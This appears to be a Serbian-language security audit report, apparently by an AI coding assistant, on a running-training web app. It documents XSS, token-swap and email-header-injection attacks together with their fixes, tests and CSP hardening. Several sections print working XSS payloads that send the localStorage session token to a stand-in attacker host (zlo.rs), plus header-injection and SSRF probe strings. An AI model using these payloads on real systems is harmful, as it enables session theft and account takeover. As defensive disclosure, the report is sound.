# Bezbednosna analiza — SUB-20

**Grana:** `claude/app-review-report-roi7oy`
**Verzija:** 140 → **141**
**Metod:** ofanzivni — svaki nalaz je **izveden napad**, ne teorijska primedba
**Testovi:** 110 → **149** (39 novih, svi bezbednosni)

> **Dopuna, verzija 151 · 212 testova.** Izveštaj je pisan na v141 i tekst ispod opisuje stanje u tom trenutku. Od tada su zatvorene još četiri stvari, pa su odgovarajući odeljci ispod označeni: **ZATVORENO**.
> 1. **`unsafe-inline` u CSP** — kod je izdvojen u `app.js`, `script-src` je sada `'self'`. Ubačena skripta se više ne izvršava ni ako provera unosa propusti. (v. „Ostaje otvoreno / 3")
> 2. **`ADMIN_EMAIL` u javnom kodu** — zamenjen poređenjem po Supabase ID-u naloga. (v. „Ostaje otvoreno / 2")
> 3. **Lični plan i istorija vlasnika** — više se ne isporučuju u kodu i ne stižu ni do jednog drugog naloga; `uskladiVlasnickePodatke()` ih uklanja i pri pokretanju i posle povlačenja sa servera.
>
> 4. **Rate-limit na `/api/wellness` i `/api/workouts`** — zatvoreno u v151. SQL za Supabase je u `supabase/rate-limit.sql`; treba ga jednom pustiti u SQL Editoru. (v. „Ostaje otvoreno / 4")
>
> Ništa više nije otvoreno.

---

## Rezime

Izvedeno je **15 napada** na pet ulaznih površina. **Osam je prošlo.** Svih osam je zatvoreno, i svaki je sada trajni test — ako se rupa vrati, pada CI.

| # | Napad | Ishod pre | Ozbiljnost |
|---|---|---|---|
| 1 | XSS kroz ID dana iz uvezenog backupa | **PROŠAO** | **KRITIČNA** |
| 2 | XSS kroz PRED red (`id`, `q`) | **PROŠAO** | **KRITIČNA** |
| 3 | XSS kroz ID dana u listi za pomeranje | **PROŠAO** | **KRITIČNA** |
| 4 | XSS kroz zapise o oporavku → kartica Oporavak | **PROŠAO** | **KRITIČNA** |
| 5 | XSS kroz zapise o oporavku → HRV grafikon | **PROŠAO** | **KRITIČNA** |
| 6 | XSS kroz zapise o oporavku → kartica treninga | **PROŠAO** | **KRITIČNA** |
| 7 | Zamena prijavljenog naloga podmetnutim tokenom | **PROŠAO** | VISOKA |
| 8 | CR/LF u naslovu mejla (ubacivanje zaglavlja) | **PROŠAO** | NISKA |
| 9 | Prototype pollution kroz uvoz backupa | odbijen | — |
| 10 | SSRF kroz `athleteId` (8 oblika) | odbijen | — |
| 11 | Krađa spiska adresa bez ovlašćenja | odbijen | — |
| 12 | Zaobilaženje dnevnog limita AI poziva | odbijen | — |
| 13 | CSRF na OAuth (Strava i intervals.icu) | odbijen | — |
| 14 | Tag injekcija kroz odgovor AI servera | odbijen | — |
| 15 | HTML injekcija u telo mejla | odbijen | — |

---

## Model pretnje

Pet mesta gde u aplikaciju ulazi podatak koji ona ne kontroliše:

| Izvor | Ko ga kontroliše | Širina |
|---|---|---|
| **Uvezen backup** | bilo ko ko ti pošalje fajl | najšira — proizvoljan JSON u celo stanje |
| URL pri OAuth povratku | ko ti pošalje link | `?code=`, `#access_token=` |
| Odgovor AI servera | Google Gemini | tekst koji ide u `innerHTML` |
| Strava / intervals.icu | njihov API i tvoje aktivnosti | nazivi, zapisi o oporavku |
| Telo zahteva ka `api/` | bilo ko sa važećom prijavom | JSON |

**Zašto je XSS najteži ishod, a ne „samo iskačući prozor":** `localStorage` drži Supabase sesiju (`sub19_sb`), Strava access + refresh token i intervals.icu token. Jedan uspešan `<img onerror>` uzima sve troje. Supabase sesija znači potpuno preuzimanje naloga; intervals.icu token po njihovoj dokumentaciji **ne ističe**.

**CSP ne spašava** *(važilo do v150 — v. „Ostaje otvoreno / 3", sada je zatvoreno)*. Aplikacija je tada bila jedna velika inline skripta, pa je `script-src` morao da dozvoli `'unsafe-inline'` — ubačena skripta se izvršava. CSP ni tada nije bio beskoristan: `connect-src 'self' supabase strava` blokira `fetch()` ka napadačevom serveru, a `img-src 'self' data:` blokira slike-svetionike. Ali **nije blokirao odlazak na drugu adresu** (`location.href='https://zlo.rs/?t='+token`), pa je izvlačenje podataka bilo moguće. Otuda zaključak koji je važio u trenutku analize: CSP smanjuje, ne uklanja — jedina prava odbrana je da injekcije nema.

Napadi u ovom izveštaju su izvedeni pod **tim** uslovima i svi su zatvoreni na izvoru, na nivou koda. Od v150 postoji i drugi sloj: kod je u `app.js`, `script-src` je `'self'`, pa se ubačena skripta više ne izvršava ni ako provera unosa negde propusti.

---

## Prošli napadi — detaljno

### 1–3. Stored XSS kroz ID-jeve iz uvezenog backupa · KRITIČNA

**Scenario:** napadač ti pošalje `backup.json` („uvezi da vidiš moj plan"). Uvoz je prihvatao proizvoljan JSON.

**Payload:**
```json
{ "genPlan": { "weeks": [ { "start": "2026-06-22", "days": [
  { "dow": 0, "tag": "tempo", "km": 8,
    "id": "\"><img src=x onerror=\"fetch('https://zlo.rs/?t='+localStorage.getItem('sub19_sb'))\">" }
]}]}}
```

**Zašto je radilo:** ID dana je završavao u HTML atributima bez `esc()`:

```js
id="ai-go-${d.id}"        id="ai-out-${d.id}"       id="lbl-tempo-${d.id}"
data-swd="${d.id}"        id="${fid('km')}"  →  f-km-${d.id}
data-wseg="${pid}"        data-wpin="${pid}"        data-q="${r.q}"
```

**Dokaz (stvarni izlaz pre popravke):**
```html
<button type="button" id="ai-go-"><img src=x onerror="fetch('https://zlo.rs/?t='+localStorage.getItem('sub19_sb'))">" class="btn-ai">
```

**Ispravka — dva nivoa, namerno:**

1. **Granica poverenja.** ID-jevi su mašinski generisani (`n1d1`, `g12d3`, `p2b`, `kt-n1d1`) i uvek odgovaraju `^[A-Za-z0-9_-]{1,64}$`. Uvoz sada odbija fajl sa bilo kojim ID-em van tog oblika — `validanId()`, `validanGenPlan()` (dani, PRED redovi, `qs` ključevi) i `losIdUStanju()` (`log`, `pred`, `predLock`, `alts`, `moves`, `vdotLog`, `knee.id`, `knee.src`, `kg.src`).
2. **Iscrtavanje.** `esc()` na svih 9 mesta, plus usklađeni CSS selektori (`querySelector` mora da traži istu, escapovanu vrednost).

Jedan nivo je dovoljan da napad ne prođe. Druga je tu jer se sutra doda kartica koja zaboravi `esc()`.

---

### 4–6. Stored XSS kroz zapise o oporavku · KRITIČNA

**Zašto je promaklo:** `/api/wellness` **već** pretvara vrednosti u brojeve (`broj()` u `izvuci()`), pa je živ put bezbedan — i lako je zaključiti da je stvar rešena. Ali `S.wellness` se puni i iz **uvoza backupa** i iz `sbPull()`, a tamo nije bilo nikakve provere. Odatle su vrednosti išle **sirove** u tri prikaza:

- kartica **Oporavak** (`karticaOporavka`) — `<b style="color:${boja}">${val}</b>`
- **HRV grafikon** — `<text ...>${v[v.length-1].hrv}</text>` (injekcija u SVG)
- red **„Tog jutra"** na kartici treninga (`formHTML`)

**Payload:** `{"wellness":{"2026-07-01":{"hrv":"\"><img src=x onerror=...>"}}}`

**Ispravka:**
1. `cistWellness()` u `migrate()` — svaka vrednost prolazi kroz pretvaranje u broj, ključ mora biti datum, sve ostalo se odbacuje. Pokriva **i uvoz i `sbPull`**, jer oba idu kroz `migrate`.
2. `esc()` na svim mestima iscrtavanja.

---

### 7. Zamena prijavljenog naloga podmetnutim tokenom · VISOKA

`sbCheckState()` je proveravao **postojanje** markera, ne poređenje vrednosti — jer Supabase GoTrue interno koristi `state` parametar za svoju CSRF zaštitu, pa aplikacija svoj ne može da provuče (to je u kodu i objašnjeno).

**Posledica:** u prozoru od 10 minuta posle klika na „Prijavi se", link `https://sub-19.vercel.app/#access_token=<NAPADAČEV_JWT>` bio bi usvojen. Odatle `sbPush()` gura **tvoje** podatke u **napadačev** Supabase red.

**Ispravka (bez ijedne izmene u Supabase podešavanjima):**
- Prozor 10 min → **3 min** (odlazak na Google i nazad traje sekunde).
- **Token za drugi nalog se odbija** dok se prethodni ne odjavi svesno — poredi se `sub` iz JWT-a sa `SB.userId`. Ovo zatvara najštetniji ishod: zamenu postojeće sesije tuđom.
- Usvojen token se **odmah proverava** kod Supabase-a; ako je neispravan, sesija se odbacuje umesto da app radi sa njom.

**Ostatak rizika (pošteno):** korisnik koji **još nije prijavljen** i klikne login, pa u ta 3 minuta otvori napadačev link — i dalje bi usvojio tuđu sesiju. Video bi tuđ mejl u Podešavanjima, ali bi mu se lokalni podaci sinhronizovali u tuđ nalog.

**Potpuno rešenje traži jednu izmenu kod tebe** (v. „Preporuke" dole).

---

### 8. CR/LF u naslovu mejla · NISKA

`subject: 'SUB-20 bug — ' + description.slice(0, 60)` — naslov gradi korisnički tekst.

**Dokaz:**
```
opis:    "Bug\nBcc: napadac@zlo.rs\nX-Evil: da"
naslov:  "SUB-20 bug — Bug\nBcc: napadac@zlo.rs\nX-Evil: da"
```

Resend prima JSON i najverovatnije bi to sam odbio, ali oslanjati se na to je pogrešan red. Novi red se sada uklanja pre slanja.

---

## Odbijeni napadi — šta je već bilo dobro

Ovo nije popunjavanje izveštaja; svaki od njih je stvarno izveden i vraćen praznih ruku.

**Prototype pollution.** `{"ui":{"__proto__":{"zagadjeno":"DA"}}}` kroz `Object.assign` u `migrate()` — prototip ostaje čist.

**SSRF.** Osam oblika `athleteId` (`1@zlo.rs`, `1/../../evil`, `i1%2f%2fzlo.rs`, `http://zlo.rs`, `1\n2`…) — svi odbijeni sa HTTP 400 pre nego što išta izađe. Nijedan zahtev nije napustio `intervals.icu`/`supabase`. Zasluga: `^i?\d+$` i fiksan URL.

**Autorizacija.** Običan prijavljen korisnik na `/api/broadcast` → **401**. Provera se radi nad mejlom pročitanim **sa Supabase servera iz tokena**, ne nad onim što pregledač tvrdi.

**Dnevni limit.** Uz `DAILY_LIMIT_EXCEEDED` LLM je pozvan **0 puta**, odgovor 429.

**OAuth CSRF.** Strava i intervals.icu: pogrešan / istekao / odsutan / **već potrošen** state — sve odbijeno; `state` je `crypto.getRandomValues`, ne `Math.random`; svaki servis ima svoj ključ pa jedan povratak ne troši tuđi.

**Odgovor AI servera.** `mdToHtml` escapuje **pre** parsiranja markdowna, pa `<img>`, `<script>`, `<svg/onload>`, `<iframe>` i `javascript:` izlaze kao tekst. Ovo je bilo dobro napisano od početka.

**Telo mejla.** Kontekst prijave buga (`userAgent`, `tab`, `version`) je escapovan.

**service_role ključ.** Postoji samo u `daily-report.js` i `broadcast.js` (oba iza `CRON_SECRET`/vlasnika), nigde u klijentu. Provereno testom koji traži **stvarnu vrednost** ključa, ne pomen imena.

---

## Novi bezbednosni testovi (39)

`test/bezbednost.test.mjs` — svaki test je napad koji je jednom prošao.

| Grupa | Šta drži zatvorenim |
|---|---|
| Granica poverenja | `validanId`, `validanGenPlan`, `losIdUStanju` — na 5 oblika payloada × 9 mapa |
| Drugi sloj | `formHTML`, `weekSwapHTML`, `renderKnee`, `renderPlan`, `renderDanas`, `openSettings`, `mdToHtml`, `safeTag` |
| Oporavak | kartica, HRV grafikon, red „Tog jutra", `cistWellness`, `migrate` |
| **Fuzz** | **otruje SVAKO polje stanja i iscrta svaki ekran i modal** |
| Tokeni | ni izvoz ni sinhronizacija ne nose tokene |
| OAuth | CSRF, nasumičnost, jednokratnost, dužina prozora, zaštita naloga |
| Server | SSRF, zaglavlja mejla, autorizacija, limit, `service_role` |

**Fuzz test je najvredniji** — ne cilja poznatu rupu nego traži one koje nisam nabrojao. Otruje `genPlan`, `log`, `pred`, `knee`, `kg`, `vdotLog`, `strava`, `icu`, `wellness`, `ui` i iscrta svih 5 tabova plus 6 modala. Ako buduća kartica zaboravi `esc()`, ovo pada bez da se test menja.

---

## Preostali rizik i preporuke

### 1. Nepotpuna zaštita Supabase prijave — traži JEDNU izmenu kod tebe

Ostatak iz napada 7 zatvara se prosleđivanjem sopstvenog nonce-a kroz `redirect_to`:

```js
location.href = SB_URL + '/auth/v1/authorize?provider=google&redirect_to='
  + encodeURIComponent(location.origin + '/?sbn=' + nonce);
```
pa se po povratku poredi `?sbn=` sa sačuvanim. Ne sudara se sa GoTrue-ovim internim `state`.

**Nisam ovo primenio** jer traži da u **Supabase → Authentication → URL Configuration → Redirect URLs** dodaš:
```
https://sub-19.vercel.app/**
```
Bez toga Supabase odbacuje `redirect_to` sa upitom i vraća na Site URL — prijava bi pukla za sve korisnike. Reci kad dodaš, pa primenim kod.

### 2. ~~`ADMIN_EMAIL` u javnom kodu~~ — ZATVORENO

Adrese više nema u klijentskom kodu. Prepoznavanje vlasnika ide preko Supabase ID-a naloga (`ADMIN_UID` + `jeVlasnik()`), a test „mejl adresa vlasnika nije u klijentskom kodu" pada ako se vrati. Politika privatnosti **zadržava** kontakt adresu — to je obaveza, ne propust, i za to postoji zaseban test.

### 3. ~~`unsafe-inline` u CSP~~ — ZATVORENO u v150

Bio je neizbežan dok je aplikacija bila jedan inline `<script>`. U v150 je telo skripte izdvojeno u `app.js`, a CSP je sada `script-src 'self'` — bez `'unsafe-inline'`.

Kod nije menjan: `git show <v149>:index.html | sed -n '590,8640p' | diff - app.js` daje tačno jednu razliku, `APP_VERSION 149 → 150`.

Šta se time dobija — pregledač od sada **odbija da izvrši** sve ovo, bez obzira kako je dospelo u HTML:

| Ubačeno | Pre (v149) | Sada (v150) |
|---|---|---|
| `<img src=x onerror="fetch('https://zlo.rs/?t='+localStorage.sub19_sb)">` | izvršava se | **blokirano** |
| `<script>navigator.sendBeacon('https://zlo.rs',localStorage.sub19_v1)</script>` | izvršava se | **blokirano** |
| `<svg onload=alert(1)>` | izvršava se | **blokirano** |
| `<iframe src="javascript:…">` | izvršava se | **blokirano** |
| `<body onpageshow="location='https://zlo.rs/?'+…">` | izvršava se | **blokirano** |

Ovo je **druga, nezavisna linija odbrane**. Prva (provera i escapovanje unosa) i dalje stoji i dalje je primarna — ali od sada jedna propuštena tačka više ne znači automatski preuzet nalog. Time pada i ograda iz odeljka „CSP ne spašava" gore: navigacija na tuđu adresu je bila moguća baš zato što je ubačeni kod mogao da se izvrši; sada ne može.

`style-src 'unsafe-inline'` **ostaje namerno** — `<style>` blok i `style="…"` atributi su i dalje inline, a ubačen stil ne izvršava kod.

Uslov se čuva testovima: `script-src` ne sme sadržati `'unsafe-inline'`; nijedna od tri HTML stranice ne sme imati `<script>` sa telom, `on*=` atribut ni `javascript:` URL; `index.html` mora učitavati `./app.js`; `app.js` mora biti u `ASSETS` u `sw.js` (inače bi se logika servirala iz starog keša).

### 4. ~~Nema rate-limita na `/api/wellness` i `/api/workouts`~~ — ZATVORENO u v151

Oba endpointa idu kroz naš server ka intervals.icu, a prijava je otvorena svakome sa Google nalogom. Bez limita je jedan prijavljen korisnik mogao u petlji da gađa intervals.icu **sa naše IP adrese** — posledice (blokada, žalba) snosi vlasnik aplikacije, ne on.

Traži novu tabelu u Supabase-u, pa je SQL u repozitorijumu: **`supabase/rate-limit.sql`**. Supabase → SQL Editor → nalepi ceo fajl → Run.

Limiti: `wellness` **100/dan**, `workouts` **40/dan** — po korisniku. Normalna upotreba je 1–5 poziva dnevno.

**Jedna tabela za sve endpointe**, naziv endpointa je obična kolona. Prve dve (`api_usage`, `bug_report_usage`) su rađene svaka za sebe, pa je svaki novi endpoint tražio novu tabelu, funkciju i dozvolu. Sledeći endpoint sada ne traži nikakvu izmenu u bazi.

**Provereno na pravom Postgresu** (16.13, lokalno; stubovani su samo `auth.users` i `auth.uid()`, koje inače daje Supabase):

| Provera | Ishod |
|---|---|
| 40 **istovremenih** poziva, limit 10 | prošlo tačno 10, dodeljeni brojevi 1–10 bez ijednog duplikata |
| Brojač posle prekoračenja | stao na 10 — izuzetak poništava uvećanje, ne raste u nedogled |
| Prijavljen korisnik čita svoj brojač | `permission denied` |
| Prijavljen korisnik ga vraća na nulu | `permission denied` |
| Prijavljen korisnik ga briše | `permission denied` |
| `anon` zove funkciju | `permission denied for function` |
| Poziv bez tokena (`auth.uid()` je null) | `NOT_AUTHENTICATED` — ne prolazi kao „0 poziva" |
| Nasumičan naziv endpointa (zaobilazak kroz nov red) | `BAD_ENDPOINT` |
| Drugi korisnik / drugi endpoint | svoj brojač, nije potrošen |
| Redovi stariji od 30 dana | sami se brišu, bez `pg_cron`-a |
| Puštanje skripte dvaput | prolazi (`if not exists` / `create or replace`) |

Zašto to drži pod paralelnim zahtevima: uvećanje i provera su **jedna** naredba (`insert … on conflict do update … returning`), pa drugi zahtev čeka na zaključan red i dobija već uvećan broj. „Pročitaj pa upiši" iz koda bi pustilo oba.

Zašto korisnik ne može do brojača: RLS je uključen, a politika **namerno nema nijedne** — ko sme da menja svoj brojač, sme i da ga vrati na nulu. Piše isključivo funkcija, kao `SECURITY DEFINER` sa zaključanim `search_path`.

**Dok SQL ne pustiš, ništa se ne kvari:** brojač koji ne odgovara propušta zahtev i upisuje upozorenje u Vercel logove (`[limit] brojac nije radio …`). Isto važi i za mrežni prekid ka Supabase-u — sinhronizacija sa satom ne sme da padne zbog brojača. Ali se **vidi**, jer limit koji tiho otkaže izgleda isto kao limit koji radi.

### 5. `ICU_REDIRECT_URI` — postavljeno, uz sitnu napomenu

Postavljeno je na Vercelu. Jedina primedba je kozmetička: dodato je i za Preview okruženje, gde adresa nije ista kao produkcijska, pa tamo ne odgovara. Ako ne testiraš OAuth na preview deploy-ovima, nema posledica.

---

## Šta i dalje nije dirano

Ista granica kao u prethodnom izveštaju, ponovo mašinski provereno posle svih bezbednosnih izmena:

| Vrednost | Pre svih izmena | Sada (v150) |
|---|---|---|
| START / RACE | 2026-06-22 / 2026-09-24 | isto |
| CILJ | 19:20–19:30 | isto |
| Nedelja u planu | 14 | isto |
| Ukupno km / treninga | 533,7 / 72 | isto |
| VDOT početni / ciljni | 48,1 / 51,3 | isto |
| PRED / QS | 25 / 24 | isto |
| WT_TARGET (14 merenja) | 82 → 75,5 kg | isto |

Izdvajanje koda u `app.js` u v150 nije moglo ovo da promeni ni slučajno, i to je provereno bajt po bajt, ne na oko:

```bash
git show 0dfed1b~1:index.html | sed -n '590,8640p' | diff - app.js
# jedina razlika: APP_VERSION 149 -> 150
```

`LS_KEY`, `SB_KEY`, prefiks `sub19-` za intervals.icu događaje, `BAZA`, env varijable, Supabase tabele i RPC-jevi, Resend — **ništa od toga nije menjano i ništa ne treba da podešavaš.**

---

## Provera

```bash
node --test "test/**/*.test.mjs"     # 212 testova
```
